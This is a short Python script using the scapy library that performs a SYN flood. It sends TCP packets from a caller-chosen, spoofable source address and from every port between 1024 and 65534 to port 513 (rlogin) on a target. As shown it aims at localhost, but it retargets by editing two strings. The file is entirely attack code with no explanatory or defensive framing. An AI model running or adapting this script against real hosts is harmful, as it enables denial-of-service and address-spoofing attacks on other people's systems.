from scapy.all import *

def syn_flood(src, dst):
    for sport in range(1024, 65535):
        ip_layer = IP(src=src, dst=dst)
        tcp_layer = TCP(sport=sport, dport=513)
        pkt = ip_layer / tcp_layer
        send(pkt)

def main():
    src = "127.0.0.1"
    dst = "127.0.0.1"
    syn_flood(src, dst)


if __name__ == "__main__":
    main()